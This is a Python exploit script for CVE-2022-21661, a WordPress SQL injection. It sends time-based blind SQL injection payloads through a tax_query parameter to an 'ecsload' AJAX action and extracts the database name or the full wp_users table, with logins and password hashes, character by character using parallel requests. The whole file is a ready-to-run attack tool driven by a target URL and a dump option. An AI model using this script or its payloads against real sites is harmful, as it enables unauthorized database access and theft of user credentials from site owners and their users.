#!/bin/python3 

import sys
import requests
import string
import time
import termios
from multiprocessing import Pool

# CVE-2022-21661
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

CLEAR_SCREEN = "\033[H\033[2J\033[3J"

PAYLOAD_DB_LEN = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH(database()) = '%s') THEN SLEEP(2) ELSE 2070 END)"]}}}"""
PAYLOAD_DB_NAME = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING(LOWER(database()),%d,1) = '%s') THEN SLEEP(2) ELSE 2070 END)"]}}}"""
PAYLOAD_USR_DMP_LEN = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users)) = '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}"""
"""
 This query is used to extract the data from the table in one go!
 select Group_CONCAT(id,":",user_login,":",user_pass,"|") from wp_users
"""
PAYLOAD_USR_DUMP = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users),%d,1) = '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}"""


config = {

	"proxies":{
		'http':'http://127.0.0.1:8080',
		'https':'http://127.0.0.1:8080'
	},

	"data": {
		"action":"ecsload",
		"query": "",
		"ecs_ajax_settings": """{"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}"""
	}
}


def log(msg):
	fd = sys.stdin.fileno()
	old = termios.tcgetattr(fd)
	new = termios.tcgetattr(fd)
	new[3] = new[3] & ~termios.ECHO  # lflags
	try:
		termios.tcsetattr(fd, termios.TCSADRAIN, new)
		sys.stdout.write(CLEAR_SCREEN)
		sys.stdout.write("%s\n" % msg)
	finally:
		termios.tcsetattr(fd, termios.TCSADRAIN, old)


def do_request(url, query, proxy=False):
	proxies = None
	data = config['data']
	
	if proxy == True:
		proxies = config['proxies']

	data['query'] = query
	#print(f"query {query}")
	start = time.time()
	r = requests.post(url, data=data, verify=False, proxies=proxies)
	"""
	 Status 500  might not allways be true, in testing the theme has a pro version 
	seems that the feature that triggers the bug is available is for pro.
	or might be a configuration issue, the key point is the timing.... 
	"""
	if r.status_code == 500:
		end = time.time()
		diff = end - start
		if diff >= 5.00:
			return True
		else:
			return False


def find_length(url, query):
	"""
		https://dev.mysql.com/doc/refman/5.7/en/mysql-cluster-limitations-database-objects.html
		acording to the documentation max size for a db and table name is 63 chars.
	"""
	length = 0
	for i in range(1, 100):
		tmp =  query % i
		log("Searching for length:\nTrying len %d" % i)
		r = do_request(url, tmp)
		if r == True:
			length = i
			break
	log("length is %d" % length)
	return length


def extract(url, query, idx):
	chars = string.ascii_letters + string.digits + string.punctuation
	for c in chars:
		tmp = query % (idx, c)
		r = do_request(url, tmp)
		if r == True:
			return idx, c
	return (idx, "?")


def errcallback(args):
	print(f"error {args}")


def sploit(url, query_len, query):
	print("Finding lenght.")
	length = 0
	value = []
	length = find_length(url, query_len)
	log("length Found is %d" % length)
	# we found the length time to extract the value
	pool = Pool(processes=3)
	value = list("- " * length)

	# define a local callback function
	def callback(args):
		idx, cr = args
		# set the value at its position
		value[(idx -1)]= cr
		# the value in the postion (idx - 1 ) is pushed to the end so remove 1
		value.pop()
		#print(args)
		log("Retrieving string: %s" % ("".join(value)))

	print("Retrieving string: %s" % ("".join(value)))
	for i in range(1,length+1):
		pool.apply_async(extract, args=(url, query, i,),callback=callback, error_callback=errcallback)

	pool.close()
	pool.join()


if __name__ == '__main__':
	if len(sys.argv[1:]) != 2:
		print(f"{__file__} [url] [option] 1 - dump db name 2 - dump users")
	else:
		if sys.argv[2] == '1':
			sploit(sys.argv[1], PAYLOAD_DB_LEN, PAYLOAD_DB_NAME)
		elif sys.argv[2] == '2':
			sploit(sys.argv[1], PAYLOAD_USR_DMP_LEN, PAYLOAD_USR_DUMP)
		